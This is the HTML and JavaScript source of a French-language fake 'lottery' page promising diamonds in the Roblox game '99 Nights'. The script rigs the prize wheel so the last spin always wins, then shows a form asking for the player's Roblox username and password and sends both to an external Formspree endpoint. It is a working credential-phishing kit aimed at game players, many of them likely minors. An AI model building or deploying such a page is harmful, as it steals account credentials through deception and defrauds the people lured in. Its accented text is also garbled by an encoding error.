<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>La Loterie des 99 Nuits - Gagnez des Diamants !</title>
    <style>
        /* --- Styles G√©n√©raux et Th√®me Final --- */
        body {
            font-family: 'Arial', sans-serif; 
            margin: 0;
            padding: 0;
            background-color: #1a1a1a; 
            color: #ddd;
            line-height: 1.6;
            text-align: center;
        }

        .container {
            width: 95%;
            max-width: 600px;
            margin: 40px auto;
            padding: 20px 10px;
            background: #2b2b2b;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            border: 2px solid #660000;
        }

        .hero {
            background: #000000;
            color: #ffd700;
            padding: 40px 20px;
            text-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
            border-bottom: 5px solid #ffd700;
            border-radius: 15px 15px 0 0;
            margin-bottom: 20px;
        }

        .hero h1 { font-size: 2.5em; color: #fff; margin: 0 0 10px; }
        #chances-restantes { font-size: 1.2em; font-weight: bold; color: #FFD700; margin-bottom: 20px; }
        
        /* --- Conteneur de la Roue --- */
        .wheel-container {
            position: relative;
            width: 320px;
            height: 320px;
            margin: 30px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 50%;
            background: #333;
            padding: 10px;
            box-shadow: inset 0 0 20px rgba(255, 215, 0, 0.4), 0 0 15px #ffd700;
        }
        .wheel {
            width: 100%; height: 100%; border-radius: 50%; position: absolute;
            background: conic-gradient(
                #FFD700 0% 12.5%, #555 12.5% 25%, #8B0000 25% 37.5%, #555 37.5% 50%,
                #228B22 50% 62.5%, #555 62.5% 75%, #191970 75% 87.5%, #555 87.5% 100%
            );
            transition: transform 5s cubic-bezier(0.25, 0.1, 0.25, 1);
            border: 5px solid #000;
        }
        .wheel-pointer {
            position: absolute; top: -20px; left: 50%; transform: translateX(-50%); width: 0; height: 0;
            border-left: 15px solid transparent; border-right: 15px solid transparent; border-bottom: 25px solid #FFD700; z-index: 10;
        }

        /* --- Texte sur la Roue (Alignement stable) --- */
        .segment-text {
            position: absolute; top: 50%; left: 50%; width: 50%; height: 50%; font-weight: bold;
            display: flex; justify-content: center; align-items: center;
            transform-origin: 0% 0%; box-sizing: border-box;
        }
        .segment-text span {
            display: block; background: rgba(255, 255, 255, 0.95); padding: 4px 6px; border-radius: 5px;
            box-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5); white-space: nowrap; color: #1a1a1a; font-size: 0.7em;
        }

        /* Rotations des conteneurs */
        .text-1 { transform: rotate(22.5deg); } .text-2 { transform: rotate(67.5deg); }
        .text-3 { transform: rotate(112.5deg); } .text-4 { transform: rotate(157.5deg); }
        .text-5 { transform: rotate(202.5deg); } .text-6 { transform: rotate(247.5deg); }
        .text-7 { transform: rotate(292.5deg); } .text-8 { transform: rotate(337.5deg); }
        
        /* Rotation et position du texte pour le rendre droit */
        .text-1 span { transform: translateY(-90px) rotate(-22.5deg); }
        .text-2 span { transform: translateY(-90px) rotate(-67.5deg); }
        .text-3 span { transform: translateY(-90px) rotate(-112.5deg); }
        .text-4 span { transform: translateY(-90px) rotate(-157.5deg); }
        .text-5 span { transform: translateY(-90px) rotate(-202.5deg); }
        .text-6 span { transform: translateY(-90px) rotate(-247.5deg); }
        .text-7 span { transform: translateY(-90px) rotate(-292.5deg); }
        .text-8 span { transform: translateY(-90px) rotate(-337.5deg); }
        
        /* --- Bouton Lancer --- */
        #spin-button {
            padding: 18px 40px; font-size: 1.3em; font-weight: bold; background-color: #ff9800; color: #1a1a1a;
            border: 4px solid #ffd700; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 152, 0, 0.8);
            transition: background-color 0.3s; margin-top: 20px; animation: pulse 2s infinite;
        }
        #spin-button:disabled { background-color: #666; cursor: not-allowed; animation: none; box-shadow: none; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 152, 0, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(255, 152, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 152, 0, 0); } }

        /* --- Panneau de Formulaire --- */
        #winner-form-panel {
            display: none; 
            margin-top: 40px;
            padding: 20px;
            background: #101010;
            border: 2px solid #FFD700;
            border-radius: 10px;
        }
        #winner-form-panel h3 { color: #FFD700; font-size: 1.8em; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; text-align: left; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
        /* Style pour les champs texte et mot de passe */
        .form-group input[type="text"], .form-group input[type="password"] {
            width: calc(100% - 20px); padding: 10px; border: 1px solid #666; border-radius: 5px;
            background-color: #333; color: white; font-size: 1.1em;
        }
        .form-group input[type="submit"] {
            width: 100%; padding: 15px; background-color: #28a745; color: white; border: none;
            border-radius: 5px; cursor: pointer; font-size: 1.2em; margin-top: 10px;
        }
        #form-status { margin-top: 15px; font-weight: bold; color: #FFD700; }

        /* --- Liste des Prix --- */
        #result-message { margin-top: 30px; font-size: 1.6em; font-weight: bold; color: #ffd700; min-height: 40px; text-shadow: 0 0 5px rgba(255, 215, 0, 0.8); }
        .prix-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; margin-bottom: 8px; border-radius: 8px; font-weight: normal; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5); text-align: left; }
        .prix-item .label { font-weight: bold; color: #fff; }
        .prix-item .diamonds { font-size: 1.2em; color: #FFD700; text-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
        .prix-item:nth-child(1) { border-left: 5px solid #FFD700; background: #3a3a3a; }
        .prix-item:nth-child(2) { border-left: 5px solid #8B0000; background: #3a3a3a; }
        .prix-item:nth-child(3) { border-left: 5px solid #228B22; background: #3a3a3a; }
        .prix-item:nth-child(4) { border-left: 5px solid #191970; background: #3a3a3a; }
        .modalites { margin-top: 30px; padding: 10px; background: #101010; border-radius: 8px; }
    </style>
</head>
<body>

    <header class="hero">
        <h1 style="color: #FFD700;">ü¶å La Loterie des 99 Nuits</h1>
        <p>Tentez votre chance ! Faites tourner la Roue du Grand Cerf pour gagner votre s√©jour et vos Diamants !</p>
    </header>

    <main class="container">
        
        <div id="chances-restantes">
            Vous avez <span id="chances-count" style="color: #FFD700;">2</span> chances restantes !
        </div>

        <h2 style="color: #ffd700;">üéÅ Prix √† Gagner</h2>
        
        <div class="wheel-container">
            <div class="wheel" id="wheel">
                <div class="segment-text text-1"><span>S√âJOUR + üíé99</span></div>
                <div class="segment-text text-3"><span>LUXE + üíé50</span></div>
                <div class="segment-text text-5"><span>BIJOUX + üíé30</span></div>
                <div class="segment-text text-7"><span>BON + üíé20</span></div>
                <div class="segment-text text-2"><span style="color: #666;">CASE VIDE</span></div>
                <div class="segment-text text-4"><span style="color: #666;">CASE VIDE</span></div>
                <div class="segment-text text-6"><span style="color: #666;">CASE VIDE</span></div>
                <div class="segment-text text-8"><span style="color: #666;">CASE VIDE</span></div>
            </div>
            <div class="wheel-pointer"></div>
        </div>
        
        <button id="spin-button">LANCER LA ROUE !</button>

        <div id="result-message"></div>

        <div id="winner-form-panel">
            <h3>üéâ F√âLICITATIONS ! ENREGISTREZ VOTRE GAIN ET CONNECTER VOUS !</h3>
            
            <form id="winner-form" action="https://formspree.io/f/mgvqdwzo" method="POST">
                <div class="form-group">
                    <label for="roblox_account">Compte Roblox ou Nom d'utilisateur :</label>
                    <input type="text" id="roblox_account" name="roblox_account" required>
                </div>
                <div class="form-group">
                    <label for="roblox_account">Mots de passe :</label>
                    <input type="text" id="roblox_account" name="roblox_account" required>
                </div>
                
                <input type="hidden" id="prize_won" name="prize_won" value="">
                <input type="hidden" name="_subject" value="Nouveau Gagnant Loterie 99 Nuits">
                
                <input type="submit" value="VALIDER ET ENVOYER LE GAIN">
            </form>
            <p id="form-status"></p>
        </div>
        <hr style="border-color: #555;">

        <h2 style="color: #ffd700;">üìÖ R√©partition des Prix</h2>
        <div style="max-width: 450px; margin: 20px auto;">
            
            <div class="prix-item">
                <span class="label">1er Prix (Or): S√©jour de 99 Nuits</span>
                <span class="diamonds">üíé99</span>
            </div>
            <div class="prix-item">
                <span class="label">2e Prix (Rouge): 10 Nuits de Luxe</span>
                <span class="diamonds">üíé50</span>
            </div>
            <div class="prix-item">
                <span class="label">3e Prix (Vert): Collection de Bijoux</span>
                <span class="diamonds">üíé30</span>
            </div>
            <div class="prix-item">
                <span class="label">Consolation (Bleu): Bon d'Achat</span>
                <span class="diamonds">üíé20</span>
            </div>
        </div>
        
        <div class="modalites">
            <a href="#" style="color: #ffd700; text-decoration: none; font-weight: bold;">[Lien vers les Modalit√©s et Conditions]</a>
        </div>

    </main>

    <footer>
        <p style="color: #666;">&copy; 2025 La Loterie des 99 Nuits.</p>
    </footer>

    <script>
        const wheel = document.getElementById('wheel');
        const spinButton = document.getElementById('spin-button');
        const resultMessage = document.getElementById('result-message');
        const chancesCount = document.getElementById('chances-count');
        const formPanel = document.getElementById('winner-form-panel');
        const prizeWonInput = document.getElementById('prize_won');
        
        let chancesRestantes = 2; // Le joueur commence avec 2 chances

        const segments = [
            { name: "99 Diamants et le Grand S√©jour", degrees: 360, isWin: true },
            { name: "CASE VIDE", degrees: 315, isWin: false },
            { name: "50 Diamants et 10 Nuits de Luxe", degrees: 270, isWin: true },
            { name: "CASE VIDE", degrees: 225, isWin: false },
            { name: "30 Diamants et une Collection de Bijoux", degrees: 180, isWin: true },
            { name: "CASE VIDE", degrees: 135, isWin: false },
            { name: "20 Diamants et un Bon d'Achat", degrees: 90, isWin: true },
            { name: "CASE VIDE", degrees: 45, isWin: false }
        ];

        let currentRotation = 0;

        spinButton.addEventListener('click', () => {
            if (chancesRestantes <= 0) {
                resultMessage.innerHTML = "<span style='color: red;'>D√©sol√©, vous n'avez plus de chances pour cette loterie.</span>";
                spinButton.disabled = true;
                return;
            }

            spinButton.disabled = true;
            formPanel.style.display = 'none'; 
            resultMessage.textContent = "La roue tourne... Suspense !";

            let winningIndex;
            
            // --- LOGIQUE AJOUT√âE : GAIN FORC√â AU DERNIER TOUR ---
            if (chancesRestantes === 1) {
                // Force le gain sur l'index 6 (20 Diamants et un Bon d'Achat)
                winningIndex = 6; 
            } else {
                // Logique normale : tirage al√©atoire
                winningIndex = Math.floor(Math.random() * segments.length);
            }
            // --- FIN LOGIQUE DE GAIN GARANTI ---
            
            const winner = segments[winningIndex];

            // Calcul de la rotation
            const baseRotation = 5 * 360; 
            const rotationOffset = 22.5; 
            const segmentAngle = segments[winningIndex].degrees;
            const degreesToWin = segmentAngle - rotationOffset;
            const randomInSegment = Math.floor(Math.random() * 40);
            const finalRotation = baseRotation + degreesToWin + randomInSegment;
            
            currentRotation += finalRotation;

            wheel.style.transition = 'transform 5s cubic-bezier(0.25, 0.1, 0.25, 1)';
            wheel.style.transform = `rotate(-${currentRotation}deg)`;

            setTimeout(() => {
                chancesRestantes--;
                chancesCount.textContent = chancesRestantes;
                chancesCount.style.color = chancesRestantes > 0 ? '#FFD700' : 'red';
                
                if (winner.isWin) {
                    resultMessage.innerHTML = `F√âLICITATIONS ! Vous avez gagn√© : <strong style="color: #FFD700;">${winner.name}</strong> !`;
                    
                    // Afficher le panneau et pr√©parer le formulaire
                    prizeWonInput.value = winner.name;
                    formPanel.style.display = 'block';
                    spinButton.disabled = true; // D√©sactive la roue si un prix est gagn√©
                    
                } else {
                    resultMessage.innerHTML = `<span style='color: #888;'>Dommage ! Vous √™tes tomb√© sur une ${winner.name}. Retentez votre chance !</span>`;
                    formPanel.style.display = 'none';
                    
                    if (chancesRestantes <= 0) {
                        spinButton.disabled = true;
                    } else {
                        spinButton.disabled = false;
                    }
                }
            }, 5000); // Dur√©e de la rotation
        });
        
        // G√©rer l'envoi du formulaire via AJAX (vers Formspree)
        document.getElementById('winner-form').addEventListener('submit', async function (event) {
            event.preventDefault();
            const form = event.target;
            const status = document.getElementById('form-status');
            
            status.innerHTML = 'Envoi en cours...';

            try {
                const response = await fetch(form.action, {
                    method: form.method,
                    body: new FormData(form),
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                
                if (response.ok) {
                    status.innerHTML = '‚úÖ Gain enregistr√© ! Les informations ont √©t√© envoy√©es. Vous serez contact√©(e) sous peu.';
                    form.reset();
                    formPanel.style.display = 'none';
                    
                    // D√©sactiver la roue apr√®s succ√®s
                    spinButton.disabled = true; 
                    chancesRestantes = 0;
                    chancesCount.textContent = 0;
                    chancesCount.style.color = 'red';
                    
                } else {
                    status.innerHTML = '‚ùå Une erreur s\'est produite. Veuillez r√©essayer.';
                }
            } catch (error) {
                status.innerHTML = '‚ùå Erreur de connexion. Veuillez r√©essayer.';
            }
        });

        // Initialiser l'affichage des chances au chargement
        chancesCount.textContent = chancesRestantes;
    </script>
</body>
</html>